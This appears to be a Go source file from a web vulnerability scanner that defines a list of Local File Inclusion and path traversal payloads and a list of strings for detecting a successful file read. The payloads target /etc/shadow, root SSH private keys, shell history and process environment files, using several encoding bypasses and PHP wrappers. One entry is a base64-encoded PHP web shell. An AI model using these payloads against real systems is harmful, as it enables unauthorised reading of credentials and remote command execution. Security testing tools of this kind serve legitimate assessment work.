package payloads

// LFIPathTraversalPayloads provides an expanded list of Local File Inclusion/Path Traversal payloads.
// It includes deeper traversal, various encoding techniques, OS-specific paths, and modern wrappers.
var LFIPathTraversalPayloads = []string{
	// --- Basic & Deep Traversal ---
	"/etc/passwd",
	"../../etc/passwd",
	"../../../etc/passwd",
	"../../../../etc/passwd",
	"../../../../../../etc/passwd",
	"../../../../../../../../etc/passwd",
	"../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../etc/passwd",
	"....//....//....//....//etc/passwd",
	".././.././.././../etc/passwd",

	// --- Null Byte Bypass (Legacy PHP) ---
	"../../../../../../../../etc/passwd%00",
	"../../../../../../../../etc/passwd%00.jpg",

	// --- URL & Double Encoding ---
	"..%2f..%2f..%2f..%2fetc%2fpasswd",
	"%2e%2e/%2e%2e/%2e%2e/etc/passwd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	"..%252f..%252f..%252f..%252fetc%252fpasswd",        // Double URL encoding
	"%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", // UTF-8 Overlong/Invalid Encoding

	// --- Windows Specific Paths ---
	"../boot.ini",
	"../../boot.ini",
	"../../../boot.ini",
	"../../../../boot.ini",
	"../windows/win.ini",
	"../../windows/win.ini",
	"../../../windows/win.ini",
	"../../../../windows/win.ini",
	"c:\\boot.ini",
	"c:\\windows\\win.ini",
	"c:\\windows\\system32\\drivers\\etc\\hosts",
	"c:\\winnt\\win.ini",

	// --- Common Linux/Unix Sensitive Files ---
	"/etc/shadow",
	"/etc/hosts",
	"/etc/group",
	"/etc/issue",
	"/etc/motd",
	"/etc/ssh/sshd_config",
	"/root/.ssh/id_rsa",
	"/root/.bash_history",
	"/home/www-data/.bash_history",
	"/var/log/apache2/access.log",
	"/var/log/apache/access.log",
	"/var/log/nginx/access.log",
	"/var/log/httpd/access_log",
	"/var/log/dmesg",
	"/proc/self/environ",
	"/proc/version",
	"/proc/cmdline",
	"/proc/self/cwd/index.php", // Context-dependent

	// --- PHP Wrappers & Filters ---
	"file:///etc/passwd",
	"php://filter/resource=/etc/passwd",
	"php://filter/read=string.rot13/resource=/etc/passwd",
	"php://filter/convert.base64-encode/resource=/etc/passwd",
	"php://filter/read=convert.base64-encode/resource=/etc/passwd",
	"php://input",                  // Expects data in POST body
	"phar://./shell.phar/test.txt", // PHAR Deserialization / File Read
	"zip://./shell.zip#test.txt",   // ZIP Wrapper
	"data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg==",
}

// LFIKeywords provides a list of keywords/patterns to detect successful LFI.
// Expanded to include content from a wider variety of system and log files.
var LFIKeywords = []string{
	// --- Linux/Unix /etc/passwd & /etc/shadow ---
	"root:x:0:0:",
	"daemon:x:1:1:",
	"nobody:x:",
	"bin:x:2:2:",
	"root:$1$",
	"root:$6$",

	// --- Windows .ini Files ---
	"[boot loader]",
	"[drivers]",
	"for 16-bit app support",
	"MCI Extensions",
	"system32",
	"c:\\windows\\system32",

	// --- Linux /proc & Log Files ---
	"Linux version",    // /proc/version
	"boot_image=",      // /proc/cmdline
	"HTTP_USER_AGENT=", // /proc/self/environ
	"GET / HTTP/1.1",   // access.log
	"[error] [client",  // error.log
	"sshd:session",     // auth.log

	// --- Generic Config Keywords ---
	"DB_PASSWORD",
	"DB_USER",
	"database_password",
	"<configuration>",
	"BEGIN RSA PRIVATE KEY",
	"BEGIN OPENSSH PRIVATE KEY",
}
